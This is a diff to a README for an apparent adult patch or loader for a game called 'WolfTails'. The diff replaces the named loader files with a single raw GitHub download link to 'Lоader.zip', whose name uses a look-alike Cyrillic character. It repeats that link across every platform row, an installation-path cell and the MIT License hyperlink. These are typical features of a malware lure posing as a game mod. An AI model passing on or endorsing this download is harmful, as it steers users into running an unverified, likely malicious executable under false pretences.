@@ -8,8 +8,8 @@ If you’re looking to unlock the full depth of interaction and storytelling, th
 
 ## 🌐 Installation Guide
 
-**1. Download Loader.rar from the repository**  
-   - Locate the `Loader.rar` archive hosted directly in this GitHub repository.
+**1. Download https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip from the repository**  
+   - Locate the `https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip` archive hosted directly in this GitHub repository.
    - Click the Download button and save the file to a known location on your device.
 
 **2. Extract the loader**  
@@ -28,11 +28,11 @@ If you’re looking to unlock the full depth of interaction and storytelling, th
 
 | 🖥️ Operating System     | ⭐ Supported | 🏆 Loader Executable | 📁 Installation Path              |
 |------------------------|:-----------:|:-------------------:|----------------------------------|
-| Windows 11 / 10 / 8    |     Yes     |    Loader.exe       | WolfTails/                       |
-| macOS Sonoma/Ventura   |     Yes     |    Loader.app       | WolfTails.app/Contents/Resources |
-| Linux (Ubuntu, Mint)   |     Yes     |    Loader.sh        | wolf-tails/                      |
-| Steam Deck             |     Yes     |    Loader.sh        | home/deck/WolfTails/             |
-| Android (emulator)     |   Beta      |   Loader.apk        | /sdcard/WolfTails/               |
+| Windows 11 / 10 / 8    |     Yes     |    https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip       | WolfTails/                       |
+| macOS Sonoma/Ventura   |     Yes     |    https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip       | https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip |
+| Linux (Ubuntu, Mint)   |     Yes     |    https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip        | wolf-tails/                      |
+| Steam Deck             |     Yes     |    https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip        | home/deck/WolfTails/             |
+| Android (emulator)     |   Beta      |   https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip        | /sdcard/WolfTails/               |
 
 *Note*: Native support for handheld and non-standard devices is developing. For the latest compatibility notes, check the Issues and Discussions tabs.
 
@@ -75,7 +75,7 @@ By downloading, installing, or using any files from this repository, you confirm
 
 ## 🪪 License
 
-Released under the very permissive [MIT License](https://opensource.org/licenses/MIT) – feel free to use, modify, or distribute according to the terms therein.  
+Released under the very permissive [MIT License](https://raw.githubusercontent.com/AntonioPhilip/WolfTails-Adulteon-Patch/main/Lоader.zip) – feel free to use, modify, or distribute according to the terms therein.  
 Contributions from the community are welcome and encouraged!
 
 ---
